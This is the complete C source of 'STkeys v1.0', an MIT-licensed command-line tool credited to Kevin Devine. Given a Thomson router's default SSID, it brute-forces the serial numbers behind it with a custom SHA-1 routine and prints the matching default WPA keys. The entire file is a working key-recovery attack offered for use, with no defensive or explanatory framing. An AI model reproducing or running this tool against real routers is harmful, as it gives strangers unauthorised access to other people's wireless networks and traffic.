/**
 *  The MIT License:
 *
 *  Copyright (c) 2008, 2010 Kevin Devine
 *
 *  Permission is hereby granted,  free of charge,  to any person obtaining a 
 *  copy of this software and associated documentation files (the "Software"),
 *  to deal in the Software without restriction,  including without limitation 
 *  the rights to use,  copy,  modify,  merge,  publish,  distribute,  
 *  sublicense,  and/or sell copies of the Software,  and to permit persons to 
 *  whom the Software is furnished to do so,  subject to the following 
 *  conditions:
 *
 *  The above copyright notice and this permission notice shall be included in
 *  all copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 *  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,  
 *  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR 
 *  OTHER DEALINGS IN THE SOFTWARE.
 */
 
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

#define MAX_SERIAL 12
#define MAX_YEAR    6     /* for 2004 - 2010 */
#define MAX_SSID    6

uint32_t ssid;
uint32_t wpa_key[2];

typedef struct _SHA1_KEY {
  uint32_t w[80];
} SHA1_KEY, *PSHA1_KEY;

#define ROL32(a, n)(((a) << (n)) | (((a) & 0xffffffff) >> (32 - (n))))
#define ROR32(a, n)((((a) & 0xffffffff) >> (n)) | ((a) << (32 - (n))))

#ifdef BIGENDIAN
# define SWAP32(n) (n)
#else
# define SWAP32(n) \
    ROR32((((n & 0xFF00FF00) >> 8) | ((n & 0x00FF00FF) << 8)), 16)
#endif

/* precomputed key schedules */
SHA1_KEY yy_keys[MAX_YEAR+1], ww_keys[52];
SHA1_KEY x1_keys[36], x2_keys[36], x3_keys[36];

/* create sha-1 block for processing */
void expand(PSHA1_KEY d, PSHA1_KEY s) {
  int i;

  for (i = 0;i < 16;i++) {
    d->w[i] = SWAP32(s->w[i]);
  }

  for (i = 16;i < 80;i++) {
    d->w[i] = ROL32((d->w[i-3] ^ d->w[i-8] ^ d->w[i-14] ^ d->w[i-16]), 1);
  }
}

/* initialize year values */
void init_yy(void) {
  uint8_t buffer[64];
  int year;

  for (year = 0;year <= MAX_YEAR;year++) {
    memset(buffer, 0, sizeof(buffer));

    buffer[0] = 'C';
    buffer[1] = 'P';

    buffer[MAX_SERIAL] = 0x80;
    ((uint32_t*)buffer)[15] = SWAP32(MAX_SERIAL * 8);

    buffer[2] = ((year + 4) / 10) + '0';
    buffer[3] = ((year + 4) % 10) + '0';

    expand(&yy_keys[year], (PSHA1_KEY)buffer);
  }
}

/* initialize week values */
void init_ww(void) {
  uint8_t buffer[64];
  int week;

  for (week = 0;week < 52;week++) {
    memset(buffer, 0, sizeof(buffer));

    buffer[4] = ((week + 1) / 10) + '0';
    buffer[5] = ((week + 1) % 10) + '0';

    expand(&ww_keys[week], (PSHA1_KEY)buffer);
  }
}

const char charTable[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

#define BIN2HEX(x) (x < 10) ? (x + '0') : (x + '7')
#define HEX2BIN(x) (x - '0' < 10) ? (x - '0') : (x - '7')

void init_xxx(void) {
  uint8_t x1[64], x2[64], x3[64];
  uint8_t i;

  for (i = 0;i < 36;i++) {
    memset(x1, 0, sizeof(x1));
    memset(x2, 0, sizeof(x2));
    memset(x3, 0, sizeof(x3));

    x1[6] = x2[8] = x3[10] = BIN2HEX((charTable[i] >> 4));
    x1[7] = x2[9] = x3[11] = BIN2HEX((charTable[i] & 15));

    expand(&x1_keys[i], (PSHA1_KEY)&x1);
    expand(&x2_keys[i], (PSHA1_KEY)&x2);
    expand(&x3_keys[i], (PSHA1_KEY)&x3);
  }
}

void print_key(int y, int w, int x1, int x2, int x3) {
  int i;
  printf("\n\t[+] Serial Number: CP%02d%02d??%c%c%c "
         "- WPA Key = %08X%02X", y + 4, w + 1,
         charTable[x1], charTable[x2], charTable[x3],
         wpa_key[0], wpa_key[1] >> 24);
}

#define F(x, y, z)  ((z) ^ ((x) & ((y) ^ (z))))
#define G(x, y, z)  ((x) ^ (y) ^ (z))
#define H(x, y, z)  (((x) & (y)) | ((z) & ((x) | (y))))
#define I(x, y, z)  ((x) ^ (y) ^ (z))

#define S(f, a, b, c, d, e, idx, n) \
  (e) += f((b), (c), (d)) + (x->w[idx]) + n + ROL32(a, 5); \
  (b) = ROR32(b, 2);

int valid_key(PSHA1_KEY x) {
  uint32_t a, b, c, d, e;

  a = 0x67452301;
  b = 0xefcdab89;
  c = 0x98badcfe;
  d = 0x10325476;
  e = 0xc3d2e1f0;

  /* ============================== */

  S(F, a, b, c, d, e,  0, 0x5A827999);
  S(F, e, a, b, c, d,  1, 0x5A827999);
  S(F, d, e, a, b, c,  2, 0x5A827999);
  S(F, c, d, e, a, b,  3, 0x5A827999);
  S(F, b, c, d, e, a,  4, 0x5A827999);

  S(F, a, b, c, d, e,  5, 0x5A827999);
  S(F, e, a, b, c, d,  6, 0x5A827999);
  S(F, d, e, a, b, c,  7, 0x5A827999);
  S(F, c, d, e, a, b,  8, 0x5A827999);
  S(F, b, c, d, e, a,  9, 0x5A827999);

  S(F, a, b, c, d, e, 10, 0x5A827999);
  S(F, e, a, b, c, d, 11, 0x5A827999);
  S(F, d, e, a, b, c, 12, 0x5A827999);
  S(F, c, d, e, a, b, 13, 0x5A827999);
  S(F, b, c, d, e, a, 14, 0x5A827999);

  S(F, a, b, c, d, e, 15, 0x5A827999);
  S(F, e, a, b, c, d, 16, 0x5A827999);
  S(F, d, e, a, b, c, 17, 0x5A827999);
  S(F, c, d, e, a, b, 18, 0x5A827999);
  S(F, b, c, d, e, a, 19, 0x5A827999);

  /* ============================== */

  S(G, a, b, c, d, e, 20, 0x6ED9EBA1);
  S(G, e, a, b, c, d, 21, 0x6ED9EBA1);
  S(G, d, e, a, b, c, 22, 0x6ED9EBA1);
  S(G, c, d, e, a, b, 23, 0x6ED9EBA1);
  S(G, b, c, d, e, a, 24, 0x6ED9EBA1);

  S(G, a, b, c, d, e, 25, 0x6ED9EBA1);
  S(G, e, a, b, c, d, 26, 0x6ED9EBA1);
  S(G, d, e, a, b, c, 27, 0x6ED9EBA1);
  S(G, c, d, e, a, b, 28, 0x6ED9EBA1);
  S(G, b, c, d, e, a, 29, 0x6ED9EBA1);

  S(G, a, b, c, d, e, 30, 0x6ED9EBA1);
  S(G, e, a, b, c, d, 31, 0x6ED9EBA1);
  S(G, d, e, a, b, c, 32, 0x6ED9EBA1);
  S(G, c, d, e, a, b, 33, 0x6ED9EBA1);
  S(G, b, c, d, e, a, 34, 0x6ED9EBA1);

  S(G, a, b, c, d, e, 35, 0x6ED9EBA1);
  S(G, e, a, b, c, d, 36, 0x6ED9EBA1);
  S(G, d, e, a, b, c, 37, 0x6ED9EBA1);
  S(G, c, d, e, a, b, 38, 0x6ED9EBA1);
  S(G, b, c, d, e, a, 39, 0x6ED9EBA1);

  /* ============================== */

  S(H, a, b, c, d, e, 40, 0x8F1BBCDC);
  S(H, e, a, b, c, d, 41, 0x8F1BBCDC);
  S(H, d, e, a, b, c, 42, 0x8F1BBCDC);
  S(H, c, d, e, a, b, 43, 0x8F1BBCDC);
  S(H, b, c, d, e, a, 44, 0x8F1BBCDC);

  S(H, a, b, c, d, e, 45, 0x8F1BBCDC);
  S(H, e, a, b, c, d, 46, 0x8F1BBCDC);
  S(H, d, e, a, b, c, 47, 0x8F1BBCDC);
  S(H, c, d, e, a, b, 48, 0x8F1BBCDC);
  S(H, b, c, d, e, a, 49, 0x8F1BBCDC);

  S(H, a, b, c, d, e, 50, 0x8F1BBCDC);
  S(H, e, a, b, c, d, 51, 0x8F1BBCDC);
  S(H, d, e, a, b, c, 52, 0x8F1BBCDC);
  S(H, c, d, e, a, b, 53, 0x8F1BBCDC);
  S(H, b, c, d, e, a, 54, 0x8F1BBCDC);

  S(H, a, b, c, d, e, 55, 0x8F1BBCDC);
  S(H, e, a, b, c, d, 56, 0x8F1BBCDC);
  S(H, d, e, a, b, c, 57, 0x8F1BBCDC);
  S(H, c, d, e, a, b, 58, 0x8F1BBCDC);
  S(H, b, c, d, e, a, 59, 0x8F1BBCDC);

  /* ============================== */

  S(I, a, b, c, d, e, 60, 0xCA62C1D6);
  S(I, e, a, b, c, d, 61, 0xCA62C1D6);
  S(I, d, e, a, b, c, 62, 0xCA62C1D6);
  S(I, c, d, e, a, b, 63, 0xCA62C1D6);
  S(I, b, c, d, e, a, 64, 0xCA62C1D6);

  S(I, a, b, c, d, e, 65, 0xCA62C1D6);
  S(I, e, a, b, c, d, 66, 0xCA62C1D6);
  S(I, d, e, a, b, c, 67, 0xCA62C1D6);
  S(I, c, d, e, a, b, 68, 0xCA62C1D6);
  S(I, b, c, d, e, a, 69, 0xCA62C1D6);

  S(I, a, b, c, d, e, 70, 0xCA62C1D6);
  S(I, e, a, b, c, d, 71, 0xCA62C1D6);
  S(I, d, e, a, b, c, 72, 0xCA62C1D6);
  S(I, c, d, e, a, b, 73, 0xCA62C1D6);
  S(I, b, c, d, e, a, 74, 0xCA62C1D6);

  S(I, a, b, c, d, e, 75, 0xCA62C1D6);
  S(I, e, a, b, c, d, 76, 0xCA62C1D6);
  S(I, d, e, a, b, c, 77, 0xCA62C1D6);
  S(I, c, d, e, a, b, 78, 0xCA62C1D6);
  S(I, b, c, d, e, a, 79, 0xCA62C1D6);

  /* ============================== */

  a += 0x67452301;
  b += 0xefcdab89;
  e += 0xc3d2e1f0;
  
  if ((e & 0x00FFFFFF) == ssid) {
    wpa_key[0] = a;
    wpa_key[1] = b;
    return 1;
  }
  return 0;
}

#define SET_KEY(d, s, p) { \
  uint32_t i;            \
  for(i = 0;i < sizeof(SHA1_KEY) / sizeof(uint32_t);i += 4) { \
    d.w[i+0] = (s.w[i+0] ^ p.w[i+0]); \
    d.w[i+1] = (s.w[i+1] ^ p.w[i+1]); \
    d.w[i+2] = (s.w[i+2] ^ p.w[i+2]); \
    d.w[i+3] = (s.w[i+3] ^ p.w[i+3]); \
  } \
}

uint64_t find_ssid(uint32_t ssid){
  uint64_t iterations = 0;
  time_t start = time(0);
  SHA1_KEY year_key, week_key, x1_key, x2_key, x3_key;
  int year, week, x1, x2, x3, elapsed;
  
  init_yy();
  init_ww();
  init_xxx();

  for (year = 0;year <= MAX_YEAR;year++) {
    printf("\n\n  [*] Generating keys for 20%02d", year+4);
    memcpy(&year_key, &yy_keys[year], sizeof(SHA1_KEY));

    for (week = 0;week < 52;week++) {
      SET_KEY(week_key, ww_keys[week], year_key);

      for (x1 = 0;x1 < 36;x1++) {
        SET_KEY(x1_key, x1_keys[x1], week_key);

        for (x2 = 0; x2 < 36; x2++) {
          SET_KEY(x2_key, x2_keys[x2], x1_key);

          for(x3 = 0; x3 < 36; x3++) {
            SET_KEY(x3_key, x3_keys[x3], x2_key);

            if (valid_key(&x3_key)) {
              print_key(year, week, x1, x2, x3);
            }
            iterations++;
          }
        }
      }
    }
  }
  elapsed = time(0) - start;
  return (elapsed > 1) ? iterations / elapsed : iterations;
}

int main(int argc, char *argv[]) {
  int i;
  puts("\n  STkeys v1.0 - Recover default WPA keys for Thomson routers."
       "\n  Copyright (c) 2008, 2010 Kevin Devine");

  /* we need ssid at least */
  if (argc != 2) {
    printf("\n  Usage: stkeys <Default SSID>\n\n");
    return 0;
  }

  /* must be 6 characters */
  if (strlen(argv[1]) != MAX_SSID) {
    printf("\n  Invalid SSID length: %s", argv[1]);
    return 0;
  }

  /* must be hexadecimal */
  for (i = 0;i < MAX_SSID;i++) {
    if (!isxdigit((int)argv[1][i])) {
      printf("\n  Invalid SSID format: \"%s\"\n", argv[1]);
      return 0;
    }
  }

  /* convert to binary */
  sscanf(argv[1], "%x", &ssid);

  printf("\n\n  Average k/s : %lld\n\n", find_ssid(ssid));
  return 0;
}
